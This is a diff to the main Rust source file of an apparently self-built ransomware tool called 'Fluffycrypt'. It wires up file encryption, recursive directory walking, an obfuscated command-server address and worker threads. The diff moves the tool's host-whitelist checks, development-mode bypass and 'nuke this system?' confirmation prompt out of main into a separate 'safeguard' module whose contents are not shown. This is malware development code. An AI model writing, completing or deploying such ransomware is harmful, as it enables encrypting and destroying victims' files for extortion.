@@ -2,9 +2,8 @@ use comms::{generate_ucid, Message};
 use encryptor::wrap_key;
 use filesystem::recurse_directory_with_channel;
 use obfuscation::get_ip;
+use safeguard::should_disable_crypto;
 use std::env;
-use std::io;
-use std::process::exit;
 use std::thread::sleep;
 use std::time::Duration;
 use std::vec::Vec;
@@ -18,6 +17,7 @@ mod comms;
 mod encryptor;
 mod filesystem;
 mod obfuscation;
+mod safeguard;
 
 const THREADS: i32 = 8;
 
@@ -44,7 +44,6 @@ const SERVER_IP: &[u8] = include_bytes!("..\\ip-port.bin");
 #[tokio::main]
 async fn main() {
     // set up monitor
-    let mut disable_cryptography = false;
     let mut builder = Subscriber::builder();
     if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV") {
         builder = builder.with_max_level(Level::DEBUG);
@@ -54,47 +53,7 @@ async fn main() {
     tracing::subscriber::set_global_default(subscriber).expect("setting tracing default failed");
     event!(Level::INFO, "-- REACHED STAGE: Tracing Started --");
 
-    if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV") {
-        event!(
-            Level::WARN,
-            "This host is a development environment, cryptographic operations will not be performed!"
-        );
-        disable_cryptography = true;
-    }
-
-    if Ok(String::from("TRUE")) != env::var("FLUFFYCRYPT_DEV")
-        && Ok(String::from("TRUE")) != env::var("FLUFFYCRYPT_ALLOW_TARGET")
-    {
-        // if not development and not allowed
-        event!(
-            Level::ERROR,
-            "This host has not been whitelisted. Fluffycrypt will now exit!"
-        );
-        exit(1);
-    } else if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV")
-        && Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_ALLOW_TARGET")
-    {
-        // if development and allowed
-        event!(
-            Level::WARN,
-            "This host has been whitelisted and has noted itself as a development system. Cryptographic operations have been re-enabled."
-        );
-        disable_cryptography = false;
-    }
-
-    if !disable_cryptography {
-        println!("Are you sure you'd like to nuke this system? ");
-        let mut input = String::new();
-        io::stdin().read_line(&mut input).unwrap();
-
-        if input.to_lowercase() != String::from("yes") {
-            disable_cryptography = true;
-            event!(
-                Level::WARN,
-                "Cryptography disabled per user input. System will still perform all stages except the encryption stage."
-            );
-        }
-    }
+    let disable_cryptography = should_disable_crypto();
 
     let mut key = encryptor::generate_key();
     let (s, r) = crossbeam_channel::unbounded();
